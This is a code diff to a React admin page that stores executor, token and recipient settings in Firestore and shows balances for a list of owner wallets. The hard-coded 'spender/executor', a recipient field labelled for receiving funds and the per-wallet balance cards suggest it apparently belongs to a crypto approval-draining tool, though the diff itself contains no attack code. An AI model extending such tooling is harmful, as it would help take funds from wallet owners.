@@ -21,7 +21,6 @@ export default function Admin() {
   const [settingsLoading, setSettingsLoading] = useState(false);
   const [settingsStatus, setSettingsStatus] = useState("");
   const [executorAddressSetting, setExecutorAddressSetting] = useState(HARDCODED_EXECUTOR);
-  const [rpcUrlSetting, setRpcUrlSetting] = useState("");
 
   // UI State
   const [selectedWallet, setSelectedWallet] = useState(null);
@@ -43,15 +42,11 @@ export default function Admin() {
       const s = snap.exists() ? snap.data() : {};
       // Fill each field with: Firestore value -> existing UI state -> env -> sensible default
       // Executor is forced to the hard-coded value
-      const execVal = HARDCODED_EXECUTOR;
-      const rpcVal = s.rpcUrl || s.RPC_URL || rpcUrlSetting || import.meta.env.VITE_RPC_URL || '';
+      const execVal = s.executorAddress || HARDCODED_EXECUTOR;
       const tokenVal = s.tokenAddress || outputToken || import.meta.env.VITE_USDT_ADDRESS || '';
-      const recipientVal = s.recipient || recipient || localStorage.getItem('admin_recipient') || '';
 
       setExecutorAddressSetting(execVal);
-      setRpcUrlSetting(rpcVal);
       setOutputToken(tokenVal);
-      setRecipient(recipientVal);
       setSettingsStatus('Loaded');
     } catch (err) {
       console.error('Failed to load settings', err);
@@ -65,11 +60,9 @@ export default function Admin() {
     setSettingsLoading(true);
     setSettingsStatus('Saving...');
     try {
-      // Do NOT persist the spender/executor address; it is forced in code.
+      // Persist only the executor address (backend may read this if implemented)
       await setDoc(docRef(db, 'admin_config', 'settings'), {
-        rpcUrl: rpcUrlSetting,
-        tokenAddress: outputToken,
-        recipient: recipient
+        executorAddress: executorAddressSetting
       }, { merge: true });
       setSettingsStatus('Saved');
     } catch (err) {
@@ -273,16 +266,6 @@ export default function Admin() {
           
           <div className="settings-grid">
             <div className="input-group">
-              <label>Target Recipient Address</label>
-              <input 
-                type="text" 
-                value={recipient} 
-                onChange={(e) => setRecipient(e.target.value)} 
-                placeholder="0x... (Wallet to receive funds)" 
-                disabled={true}
-              />
-            </div>
-            <div className="input-group">
               <label>Output Token Address</label>
               <input 
                 type="text" 
@@ -306,7 +289,7 @@ export default function Admin() {
               <div className="card-header">
                 <span className="wallet-icon">👝</span>
                 <span className="wallet-addr">{owner.slice(0, 6)}...{owner.slice(-4)}</span>
-                <span className="wallet-balance">{balances[owner] ? `${balances[owner]} ETH` : 'Loading...'}</span>
+                <span className="wallet-balance">{balances[owner] ? `${balances[owner]} ETH · ${tokenBalances[owner] ? `${tokenBalances[owner]} ${tokenSymbol}` : '...'}` : 'Loading...'}</span>
               </div>
               <div className="card-body">
                 <div className="stat-row">
@@ -401,23 +384,7 @@ export default function Admin() {
               <div className="input-group">
                 <label>Executor Address</label>
                 <input value={executorAddressSetting} onChange={e => setExecutorAddressSetting(e.target.value)} placeholder="0x..." />
-              </div>
-              <div className="input-group">
-                <label>Spender / Executor</label>
-                <input value={HARDCODED_EXECUTOR} readOnly placeholder="Hard-coded spender" />
-                <div style={{fontSize:12,color:'#aaa',marginTop:6}}>Spender address is hard-coded in the backend and cannot be changed via the UI.</div>
-              </div>
-              <div className="input-group">
-                <label>RPC URL</label>
-                <input value={rpcUrlSetting} onChange={e => setRpcUrlSetting(e.target.value)} placeholder="https://..." />
-              </div>
-              <div className="input-group">
-                <label>Token Address</label>
-                <input value={outputToken} onChange={e => setOutputToken(e.target.value)} placeholder="0x..." />
-              </div>
-              <div className="input-group">
-                <label>Recipient Address</label>
-                <input value={recipient} onChange={e => setRecipient(e.target.value)} placeholder="0x..." />
+                <div style={{fontSize:12,color:'#aaa',marginTop:6}}>This will be saved to admin settings; backend must be configured to use it.</div>
               </div>
 
               <div style={{display:'flex',gap:8,marginTop:12}}>
